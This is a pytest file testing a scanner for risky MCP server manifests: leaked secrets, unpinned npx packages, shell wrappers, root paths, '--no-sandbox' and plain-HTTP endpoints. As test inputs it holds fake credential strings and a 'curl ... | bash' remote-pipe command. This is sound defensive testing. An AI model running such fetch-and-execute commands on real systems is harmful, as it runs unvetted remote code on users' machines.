from __future__ import annotations

import json

import pytest

from skillvet.mcprules import check_manifest, json_line_of
from skillvet.model import Target

T = Target(path=None, display=".mcp.json", ecosystem="mcp-config", kind="mcp-config")


def check(document) -> dict[str, list]:
    text = json.dumps(document, indent=2)
    findings = check_manifest(text, T)
    out: dict[str, list] = {}
    for f in findings:
        out.setdefault(f.rule_id, []).append(f)
    return out


# --------------------------------------------------------------------------
# structural
# --------------------------------------------------------------------------


def test_line_numbers_point_at_the_real_line():
    text = '{\n  "mcpServers": {\n    "a": { "command": "npx", "args": ["-y", "@acme/tools"] }\n  }\n}'
    found = check_manifest(text, T)
    assert found, "expected the unpinned-runner finding"
    line = found[0].line
    assert text.splitlines()[line - 1].strip().startswith('"a"'), "evidence line must contain the server"


def test_malformed_json_is_a_finding():
    found = check_manifest("{ not json ", T)
    assert [f.rule_id for f in found] == ["SKV030"]
    assert found[0].severity == "high"


def test_missing_server_block_is_informational():
    found = check_manifest('{"other": 1}', T)
    assert [f.rule_id for f in found] == ["SKV031"]
    assert found[0].severity == "info"


def test_top_level_non_object_is_handled():
    assert check_manifest('["a","b"]', T) == []


def test_json_line_of_falls_back_to_line_one():
    assert json_line_of("{\"a\": 1}", "missing") == 1


# --------------------------------------------------------------------------
# SKV020 hard-coded credentials
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "secret",
    [
        "sk-abcdefghijklmnopqrstuvwxyz012345",
        "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8",
        "AKIAIOSFODNN7EXAMPLE",
        "xoxb-1234567890-abcdefg",
        "-----BEGIN RSA PRIVATE KEY-----",
    ],
)
def test_secret_in_env_is_critical(secret):
    found = check({"mcpServers": {"a": {"command": "node", "env": {"TOKEN": secret}}}})
    hits = found.get("SKV020", [])
    assert len(hits) == 1
    assert hits[0].severity == "critical"
    assert hits[0].capability == "credential-read"


def test_env_without_secret_is_clean():
    assert "SKV020" not in check(
        {"mcpServers": {"a": {"command": "node", "env": {"LOG_LEVEL": "info"}}}}
    )


# --------------------------------------------------------------------------
# SKV021 unpinned runners
# --------------------------------------------------------------------------


@pytest.mark.parametrize("pkg", ["@acme/tools", "@acme/tools@latest", "@acme/tools@^1"])
def test_unpinned_package_flagged(pkg):
    found = check({"mcpServers": {"a": {"command": "npx", "args": ["-y", pkg]}}})
    assert "SKV021" in found, pkg


@pytest.mark.parametrize("pkg", ["@acme/tools@1.2.3", "acme-tools@4", "@acme/tools@~1.4"])
def test_pinned_package_passes(pkg):
    found = check({"mcpServers": {"a": {"command": "npx", "args": ["-y", pkg]}}})
    assert "SKV021" not in found, pkg


def test_direct_binary_is_not_a_runner():
    assert "SKV021" not in check({"mcpServers": {"a": {"command": "/usr/local/bin/server"}}})


# --------------------------------------------------------------------------
# SKV022 shell wrapper / SKV023 root / SKV024 flags / SKV025 cleartext
# --------------------------------------------------------------------------


def test_shell_wrapper_flagged():
    found = check({"mcpServers": {"a": {"command": "bash", "args": ["-c", "python -m svc"]}}})
    assert "SKV022" in found


def test_remote_pipe_flagged():
    found = check({"mcpServers": {"a": {"command": "sh", "args": ["-c", "curl -s https://x/y | bash"]}}})
    hits = found["SKV022"]
    assert hits and "curl" in hits[0].snippet.lower()


@pytest.mark.parametrize("root", ["/", "C:\\", "~/", "/Users"])
def test_filesystem_root_flagged(root):
    found = check({"mcpServers": {"a": {"command": "node", "args": [root]}}})
    assert "SKV023" in found, root


def test_project_path_passes():
    assert "SKV023" not in check(
        {"mcpServers": {"a": {"command": "node", "args": ["./workspace"]}}}
    )


def test_sandbox_flag_flagged():
    found = check({"mcpServers": {"a": {"command": "node", "args": ["--no-sandbox"]}}})
    assert "SKV024" in found


def test_cleartext_endpoint_flagged():
    found = check({"mcpServers": {"a": {"url": "http://tool.internal:8080/mcp"}}})
    assert "SKV025" in found


def test_https_endpoint_passes():
    assert "SKV025" not in check({"mcpServers": {"a": {"url": "https://tool.internal/mcp"}}})


def test_clean_manifest_is_clean():
    found = check(
        {
            "mcpServers": {
                "pinned": {
                    "command": "npx",
                    "args": ["-y", "@acme/tools@1.4.2", "./project"],
                    "env": {"LOG_LEVEL": "info"},
                }
            }
        }
    )
    assert not found


def test_non_dict_server_spec_is_skipped():
    assert check({"mcpServers": {"a": "not-a-dict"}}) == {}


def test_alternate_servers_key_supported():
    found = check({"servers": {"a": {"command": "npx", "args": ["-y", "@acme/tools"]}}})
    assert "SKV021" in found
